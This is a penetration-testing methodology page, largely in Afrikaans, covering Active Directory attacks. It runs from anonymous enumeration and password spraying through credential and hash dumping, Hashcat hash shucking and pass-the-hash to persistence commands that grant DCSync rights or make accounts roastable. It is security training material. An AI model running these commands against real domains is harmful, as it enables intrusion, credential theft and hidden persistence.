# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basiese oorsig

**Active Directory** dien as 'n fundamentele tegnologie wat **netwerkadministrateurs** in staat stel om **domeine**, **gebruikers**, en **voorwerpe** binne 'n netwerk doeltreffend te skep en te bestuur. Dit is ontwerp om te skaal, en maak dit moontlik om 'n groot aantal gebruikers in hanteerbare **groepe** en **subgroepe** te organiseer, terwyl **toegangsregte** op verskeie vlakke beheer word.

Die struktuur van **Active Directory** bestaan uit drie hooflae: **domeine**, **trees**, en **forests**. 'n **Domein** sluit 'n versameling voorwerpe in, soos **gebruikers** of **toestelle**, wat 'n gemeenskaplike databasis deel. **Trees** is groepe van hierdie domeine wat deur 'n gedeelde struktuur verbind is, en 'n **forest** verteenwoordig die versameling van verskeie trees, gekoppel deur **trust relationships**, wat die boonste laag van die organisatoriese struktuur vorm. Spesifieke **toegangs** en **kommunikasie regte** kan op elkeen van hierdie vlakke aangewys word.

Sleutelkonsepte binne **Active Directory** sluit in:

1. **Directory** – Berg alle inligting wat verband hou met Active Directory-voorwerpe.
2. **Object** – Dui entiteite binne die directory aan, insluitend **gebruikers**, **groepe**, of **gedeelde gidse**.
3. **Domain** – Dien as 'n houer vir directory-voorwerpe; verskeie domeine kan binne 'n **forest** bestaan, elk met hul eie versameling voorwerpe.
4. **Tree** – 'n Groepering van domeine wat 'n gemeenskaplike root-domein deel.
5. **Forest** – Die hoogste vlak van organisatoriese struktuur in Active Directory, saamgestel uit verskeie trees met **trust relationships** tussen hulle.

**Active Directory Domain Services (AD DS)** sluit 'n aantal dienste in wat krities is vir die gesentraliseerde bestuur en kommunikasie binne 'n netwerk. Hierdie dienste bestaan uit:

1. **Domain Services** – Sentraliseer data-opberging en bestuur interaksies tussen **gebruikers** en **domeine**, insluitend **authentication** en **search** funksionaliteit.
2. **Certificate Services** – Beheer die skepping, verspreiding en bestuur van veilige **digital certificates**.
3. **Lightweight Directory Services** – Ondersteun directory-ingeskakelde toepassings deur die **LDAP protocol**.
4. **Directory Federation Services** – Verskaf **single-sign-on** vermoëns om gebruikers oor verskeie webtoepassings in een sessie te autentiseer.
5. **Rights Management** – Help om kopiereg-beskermde materiaal te beskerm deur ongeoorloofde verspreiding en gebruik te reguleer.
6. **DNS Service** – Krities vir die resolusie van **domain names**.

Vir 'n meer gedetailleerde verduideliking, sien: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Om te leer hoe om 'n **AD** aan te val, moet jy die **Kerberos authentication process** baie goed verstaan.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Spiekbrief

Jy kan [https://wadcoms.github.io/](https://wadcoms.github.io) gebruik om vinnig te sien watter opdragte jy kan uitvoer om 'n AD te enumerateer/uit te buit.

> [!WARNING]
> Kerberos-kommunkasie vereis 'n volledige gekwalifiseerde naam (FQDN) om aksies uit te voer. As jy probeer om 'n masjien via die IP-adres te benader, sal dit NTLM gebruik en nie Kerberos nie.

## Recon Active Directory (No creds/sessions)

As jy net toegang het tot 'n AD-omgewing maar geen kredensiale/sessies nie, kan jy:

- **Pentest the network:**
- Scan die netwerk, vind masjiene en oop poorte en probeer om kwesbaarhede te exploit of kredensiale uit hulle te onttrek (byvoorbeeld, [printers could be very interesting targets](ad-information-in-printers.md)).
- DNS-enumerasie kan inligting gee oor sleutel bedieners in die domein soos web, printers, shares, vpn, media, ens.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Kyk na die Algemene [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) vir meer inligting oor hoe om dit te doen.
- **Check for null and Guest access on smb services** (dit sal nie op moderne Windows-weergawe werk nie):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 'n Meer gedetailleerde gids oor hoe om 'n SMB-bediener te enumerateer kan hier gevind word:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 'n Meer gedetailleerde gids oor hoe om **LDAP** te enumerateer kan hier gevind word (let **spesiale aandag aan die anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Versamel kredensiale deur services te impersonate met **Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Verkry toegang tot 'n host deur die [**relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) te misbruik
- Versamel kredensiale deur vals **UPnP**-dienste bloot te stel met **evil-S** (../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Onttrek gebruikersname/names uit interne dokumente, sosiale media, dienste (hoofsaaklik web) binne die domeinomgewings en ook uit publiek beskikbare bronne.
- As jy die volle name van maatskappy-werkers vind, kan jy verskillende **AD username conventions** probeer ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Die mees algemene konvensies is: _NameSurname_, _Name.Surname_, _NamSur_ (3 letters van elke), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Gebruiker enumerasie

- **Anonymous SMB/LDAP enum:** Kyk die [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) en [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) bladsye.
- **Kerbrute enum**: Wanneer 'n **ongeldige username** versoek word, sal die bediener reageer met die **Kerberos error** kode _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, wat ons toelaat om te bepaal dat die gebruikersnaam ongeldig was. **Geldige gebruikersname** sal óf die **TGT in 'n AS-REP** reaksie of die fout _KRB5KDC_ERR_PREAUTH_REQUIRED_ veroorsaak, wat aandui dat die gebruiker vereis word om pre-authentication uit te voer.
- **No Authentication against MS-NRPC**: Gebruik auth-level = 1 (No authentication) teen die MS-NRPC (Netlogon) koppelvlak op domain controllers. Die metode roep die `DsrGetDcNameEx2` funksie nadat die MS-NRPC koppelvlak gebind is om na te gaan of die gebruiker of rekenaar bestaan sonder enige credentials. Die [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool implementeer hierdie tipe enumerasie. Die navorsing kan hier gevind word [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

As jy een van hierdie servers in die netwerk vind, kan jy ook **user enumeration** daarteen uitvoer. Byvoorbeeld, kan jy die hulpmiddel [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Jy kan lysies van gebruikersname vind in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  en hierdie een ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Hou egter in gedagte dat jy die **naam van die mense wat by die maatskappy werk** uit die recon-stap behoort te hê wat jy voorheen moes uitgevoer het. Met die voor- en vannaam kan jy die script [**namemash.py**](https://gist.github.com/superkojiman/11076951) gebruik om potensiële geldige gebruikersname te genereer.

### Knowing one or several usernames

Ok, jy weet dus reeds van 'n geldige gebruikersnaam maar het geen wagwoorde nie... Probeer dan:

- [**ASREPRoast**](asreproast.md): As 'n gebruiker **nie die** attribuut _DONT_REQ_PREAUTH_ het nie, kan jy 'n **AS_REP message** vir daardie gebruiker versoek wat data sal bevat wat met 'n afleiding van die gebruiker se wagwoord geënkripteer is.
- [**Password Spraying**](password-spraying.md): Probeer die mees **algemene wagwoorde** met elkeen van die ontdekte gebruikers; dalk gebruik 'n gebruiker 'n swak wagwoord (hou die password policy in gedagte!).
- Let ook daarop dat jy ook **OWA servers kan spray** om toegang tot gebruikers se mail servers te probeer kry.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Jy mag in staat wees om sekere challenge **hashes** te bekom om te kraak deur poisoning van sekere protokolle op die **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

As jy daarin geslaag het om die active directory te enumereer sal jy **meer e-posadresse en 'n beter begrip van die netwerk** hê. Jy mag in staat wees om NTLM **relay attacks** af te dwing om toegang tot die AD-omgewing te kry.

### Steal NTLM Creds

As jy met die **null of guest user** toegang tot ander PCs of shares kan kry, kan jy **lêers plaas** (soos 'n SCF file) wat, as dit op een of ander manier geopen/sien word, 'n NTLM-authenticatie teen jou sal **trigger** sodat jy die **NTLM challenge** kan **steel** om dit te kraak:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** hanteer elke NT hash wat jy reeds besit as 'n kandidaat-wagwoord vir ander, stadiger formate waarvan die sleutelmateriaal direk van die NT hash afgeleid word. In plaas daarvan om lang passphrases in Kerberos RC4 tickets, NetNTLM challenges, of cached credentials te brute-force, voer jy die NT hashes in Hashcat se NT-candidate modes en laat dit wagwoordhergebruik valideer sonder om ooit die plaintekst te leer. Dit is veral kragtig na 'n domain compromise waar jy duisende huidige en historiese NT hashes kan insamel.

Gebruik shucking wanneer:

- Jy 'n NT-korpus het van DCSync, SAM/SECURITY dumps, of credential vaults en moet toets vir hergebruik in ander domains/forests.
- Jy RC4-gebaseerde Kerberos materiaal (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, of DCC/DCC2 blobs vasvang.
- Jy vinnig hergebruik wil bewys vir lang, onkraakbare passphrases en onmiddellik via Pass-the-Hash wil pivot.

Die tegniek **werk nie** teen enkripsietipes waarvan die sleutels nie die NT hash is nie (bv. Kerberos etype 17/18 AES). As 'n domain AES-only afdwing, moet jy terugval na die gewone wagwoord-modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Gebruik `secretsdump.py` met history om die grootste moontlike stel NT hashes (en hul vorige waardes) te gryp:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries verbrei die kandidaat-poel dramaties omdat Microsoft tot 24 vorige hashes per rekening kan stoor. Vir meer maniere om NTDS-secrets te oes, sien:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (of Mimikatz `lsadump::sam /patch`) onttrek lokale SAM/SECURITY data en cached domain logons (DCC/DCC2). De-dupliseer en voeg daardie hashes by dieselfde `nt_candidates.txt` lys.
- **Track metadata** – Hou die username/domain wat elke hash geproduseer het by (selfs as die woordlys slegs hex bevat). Bypassende hashes vertel jou onmiddellik watter prinsipe 'n wagwoord hergebruik sodra Hashcat die wenkandidaat druk.
- Verkies kandidaat-hashes uit dieselfde forest of 'n trusted forest; dit maksimeer die kans op oorvleueling wanneer jy shuck.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derivates die RC4 sleutel van elke NT kandidaat en valideer die `$krb5tgs$23$...` blob. 'n Wedstryd bevestig dat die service account een van jou bestaande NT hashes gebruik.

3. Immediêd pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Jy kan opsioneel later die plaintekst herstel met `hashcat -m 1000 <matched_hash> wordlists/` indien nodig.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons van 'n gekompromitteerde workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopieer die DCC2-lyn vir die interessante domain user in `dcc2_highpriv.txt` en shuck dit:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 'n Suksesvolle wedstryd lewer die NT hash wat reeds in jou lys bekend is, wat bewys dat die cached user 'n wagwoord hergebruik. Gebruik dit direk vir PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) of brute-force dit in die vinnige NTLM mode om die string te herstel.

Dieselfde workflow geld vir NetNTLM challenge-responses (`-m 27000/27100`) en DCC (`-m 31500`). Sodra 'n wedstryd geïdentifiseer is kan jy relay, SMB/WMI/WinRM PtH, of die NT hash weer offline met masks/rules herkraak.

## Enumerating Active Directory WITH credentials/session

Vir hierdie fase moet jy **die credentials of 'n session van 'n geldige domain account gekompromitteer het.** As jy geldige credentials of 'n shell as 'n domain user het, **onthou dat die opsies wat vroeër genoem is steeds opsies is om ander gebruikers te kompromitteer.**

Voordat jy met geauthentiseerde enumerering begin, behoort jy te weet wat die **Kerberos double hop problem** is.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Om 'n rekening gekompromitteer te hê, is 'n **groot stap om die hele domain te begin kompromitteer**, omdat jy dan die **Active Directory Enumeration** kan begin:

Met betrekking tot [**ASREPRoast**](asreproast.md) kan jy nou elke moontlike kwesbare gebruiker vind, en met betrekking tot [**Password Spraying**](password-spraying.md) kan jy 'n **lys van al die gebruikersname** kry en die wagwoord van die gekompromitteerde rekening, leë wagwoorde en nuwe belowende wagwoorde probeer.

- Jy kan die [**CMD gebruik vir basiese recon**](../basic-cmd-for-pentesters.md#domain-info)
- Jy kan ook [**powershell vir recon**](../basic-powershell-for-pentesters/index.html) gebruik wat stealthier sal wees
- Jy kan ook [**powerview gebruik**](../basic-powershell-for-pentesters/powerview.md) om meer gedetailleerde inligting te onttrek
- Nog 'n wonderlike tool vir recon in 'n active directory is [**BloodHound**](bloodhound.md). Dit is **nie baie stealthy** nie (afhangend van die collection-metodes wat jy gebruik), maar **as jou dit nie omgee nie**, behoort jy dit beslis te probeer. Vind waar gebruikers kan RDP, vind paaie na ander groups, ens.
- **Ander geoutomatiseerde AD enumerasie tools is:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) omdat dit interessant inligting kan bevat.
- 'n **GUI tool** wat jy kan gebruik om die directory te enumereer is **AdExplorer.exe** van die **SysInternal** Suite.
- Jy kan ook in die LDAP databasis soek met **ldapsearch** om na credentials te kyk in velde _userPassword_ & _unixUserPassword_, of selfs in _Description_. Sien bv. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) vir ander metodes.
- As jy **Linux** gebruik, kan jy die domain ook enumereer met [**pywerview**](https://github.com/the-useless-one/pywerview).
- Jy kan ook geoutomatiseerde tools probeer soos:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Dit is baie maklik om al die domain gebruikersname van Windows te kry (`net user /domain` ,`Get-DomainUser` of `wmic useraccount get name,sid`). In Linux kan jy gebruik: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` of `enum4linux -a -u "user" -p "password" <DC IP>`

> Selfs al lyk hierdie Enumerasie-afdeling klein, dit is die belangrikste deel van alles. Toegang die skakels (hoofsaaklik die een vir cmd, powershell, powerview en BloodHound), leer hoe om 'n domain te enumereer en oefen totdat jy gemaklik voel. Tydens 'n assessment sal dit die sleutel oomblik wees om jou pad na DA te vind of om te besluit dat niks gedoen kan word nie.

### Kerberoast

Kerberoasting behels die bekom van **TGS tickets** wat deur services gekoppel aan gebruikersrekeninge gebruik word en hul enkripsie te kraak—wat gebaseer is op gebruikerswagwoorde—**offline**.

Meer hieroor in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Sodra jy sommige credentials verkry het, kan jy kyk of jy toegang tot enige **masjien** het. Hiervoor kan jy **CrackMapExec** gebruik om te probeer koppel aan verskeie servers met verskillende protokolle, ooreenkomstig jou port scans.

### Local Privilege Escalation

As jy credentials of 'n session as 'n gewone domain user gekompromitteer het en jy het **toegang** met hierdie gebruiker tot **enige masjien in die domain**, behoort jy te probeer om plaaslike privileges op te stoot en te looter vir credentials. Dit is omdat slegs met lokale administrator privileges jy in staat sal wees om **hashes van ander gebruikers** in memory (LSASS) en lokaal (SAM) te dump.

Daar is 'n volledige bladsy in hierdie boek oor [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) en 'n [**checklist**](../checklist-windows-privilege-escalation.md). Moet ook nie vergeet om [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) te gebruik nie.

### Current Session Tickets

Dit is baie **onwaarskynlik** dat jy **tickets** in die huidige gebruiker sal vind wat jou toestemming gee om onwaarskynlike hulpbronne te bereik, maar jy kan dit nagaan:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

As jy daarin geslaag het om die active directory te enumereer sal jy **meer e-posadresse en 'n beter begrip van die netwerk** hê. Jy mag daarin slaag om NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Soek vir Creds in Computer Shares | SMB Shares

Nou dat jy 'n paar basiese credentials het, moet jy kyk of jy enige **interessante lêers wat binne die AD gedeel word** kan **vind**. Jy kan dit handmatig doen, maar dit is 'n baie vervelige, herhalende taak (en nog meer as jy honderde dokumente vind wat jy moet nagaan).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

As jy toegang tot ander PCs of shares kan kry, kan jy **lêers plaas** (soos 'n SCF file) wat, as dit op een of ander manier geopen word, 'n **NTLM authentication against you** sal trigger sodat jy die **NTLM challenge** kan **steel** om dit te kraak:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Hierdie kwesbaarheid het enige geverifieerde gebruiker toegelaat om die **domain controller** te **kompromiseer**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Vir die volgende tegnieke is 'n gewone domain user nie genoeg nie, jy benodig sekere spesiale voorregte/credentials om hierdie aanvalle uit te voer.**

### Hash extraction

Hopelik het jy daarin geslaag om 'n **local admin**-rekening te kompromiteer met behulp van [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Dan is dit tyd om al die hashes in geheue en plaaslik te dump.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sodra jy die hash van 'n gebruiker het**, kan jy dit gebruik om hom te **imiteren**.\
Jy moet 'n **tool** gebruik wat die **NTLM authentication using** daardie **hash** sal uitvoer, **of** jy kan 'n nuwe **sessionlogon** skep en daardie **hash** in **LSASS** injekteer, sodat wanneer enige **NTLM authentication** uitgevoer word, daardie **hash** gebruik sal word. Die laaste opsie is wat mimikatz doen.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Hierdie aanval poog om die **user NTLM hash te gebruik om Kerberos tickets aan te vra**, as 'n alternatief vir die algemene Pass The Hash oor die NTLM-protokol. Dit kan dus veral **nuttig wees in netwerke waar NTLM protocol is disabled** en slegs **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In die **Pass The Ticket (PTT)** aanvalsmethode steel aanvalleerders 'n gebruiker se **authentication ticket** in plaas van hul wagwoord of hash-waardes. Hierdie gesteelde ticket word dan gebruik om as die gebruiker voor te doen, en sodoende ongemagtigde toegang tot hulpbronne en dienste binne 'n netwerk te verkry.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

As jy die **hash** of **password** van 'n **local administrator** het, moet jy probeer om lokaal op ander **PCs** aan te meld daarmee.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Neem kennis dat dit redelik **opvallend** is en **LAPS** dit sou **beperk**.

### MSSQL Misbruik & Vertroude Skakels

Indien 'n gebruiker voorregte het om **access MSSQL instances**, kan hy dit gebruik om **execute commands** op die MSSQL-gasheer uit te voer (indien dit as SA loop), die NetNTLM **hash** te **steal** of selfs 'n **relay attack** uit te voer.\
Ook, as 'n MSSQL-instansie deur 'n ander MSSQL-instansie vertrou word (database link) en die gebruiker voorregte oor die vertroude databasis het, sal hy in staat wees om die **trust relationship te gebruik om ook in die ander instansie queries uit te voer**. Hierdie vertroue kan gekaakel word en op 'n stadium mag die gebruiker 'n verkeerd geconfigureerde databasis vind waar hy commands kan execute.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT-bate/deployment-platforms misbruik

Derdeparty-inventaris- en deployment-suites openbaar dikwels kragtige paaie na credentials en code execution. Sien:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Indien jy enige Computer-objek vind met die attribuut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) en jy het domain privileges op die rekenaar, sal jy in staat wees om TGTs uit die geheue te dump van elke gebruiker wat by die rekenaar aanmeld.\
Dus, as 'n **Domain Admin logins onto the computer**, sal jy sy TGT kan dump en hom kan impersonate using [Pass the Ticket](pass-the-ticket.md).\
Dankie aan constrained delegation kan jy selfs **outomaties 'n Print Server compromise** (hopelik is dit 'n DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Indien 'n gebruiker of rekenaar toegelaat word vir "Constrained Delegation" sal dit in staat wees om **impersonate any user to access some services in a computer**.\
Dan, indien jy die **hash compromise** van hierdie gebruiker/rekenaar kry, sal jy in staat wees om **impersonate any user** (selfs Domain Admins) om toegang tot sekere services te kry.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Om **WRITE**-privilege op 'n Active Directory-voorwerp van 'n afstandrekenaar te hê, maak dit moontlik om code execution met **elevated privileges** te verkry:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissies/ACLs-misbruik

Die gekompromitteerde gebruiker kan sommige **interessante voorregte oor sekere domeinobjekte** hê wat jou toelaat om lateraal te **move** of voorregte te **escalate**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler diens misbruik

Om 'n **Spool-diens wat luister** binne die domein te ontdek, kan misbruik word om **nuwe credentials te verkry** en **privileges te eskaleer**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Derdeparty-sessies misbruik

Indien **ander gebruikers** die **gekompromitteerde** masjien **access**, is dit moontlik om **credentials uit geheue te versamel** en selfs **beacons in hul prosesse te inject** om hulle te impersonate.\
Gewoonlik sal gebruikers toegang tot die stelsel kry via RDP, so hier is hoe om 'n paar aanvalle oor derdeparty RDP-sessies uit te voer:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** verskaf 'n stelsel vir die bestuur van die **local Administrator password** op domain-joined computers, wat verseker dat dit **randomized**, uniek en gereeld **changed** word. Hierdie wagwoorde word in Active Directory gestoor en toegang word deur ACLs slegs aan gemagtigde gebruikers beheer. Met voldoende permissies om hierdie wagwoorde te read, word pivoting na ander rekenaars moontlik.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Die **gathering certificates** vanaf die gekompromitteerde masjien kan 'n manier wees om privileges binne die omgewing te eskaleer:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Indien **vulnerable templates** geconfigureer is, is dit moontlik om hulle te misbruik om privileges te eskaleer:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-uitbuiting met hoë-voorreg-rekening

### Uittrek van domeinkredensiale

Sodra jy **Domain Admin** of beter nog **Enterprise Admin** voorregte kry, kan jy die **domein-databasis** dump: _ntds.dit_.

[**Meer inligting oor DCSync attack can be found here**](dcsync.md).

[**Meer inligting oor hoe om die NTDS.dit te steel can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Sommige van die tegnieke hierbo bespreek kan gebruik word vir persistentie.\
Byvoorbeeld, jy kan:

- Maak gebruikers kwesbaar vir [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Maak gebruikers kwesbaar vir [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Gee [**DCSync**](#dcsync) voorregte aan 'n gebruiker

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Die **Silver Ticket attack** skep 'n **legitieme Ticket Granting Service (TGS) ticket** vir 'n spesifieke diens deur die **NTLM hash** te gebruik (byvoorbeeld, die **hash van die PC account**). Hierdie metode word aangewend om toegang tot die diens se voorregte te kry.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

'n **Golden Ticket attack** behels 'n aanvaller wat toegang kry tot die **NTLM hash van die krbtgt account** in 'n Active Directory-omgewing. Hierdie rekening is spesiaal omdat dit gebruik word om alle **Ticket Granting Tickets (TGTs)** te teken, wat noodsaaklik is vir verifikasie binne die AD-netwerk.

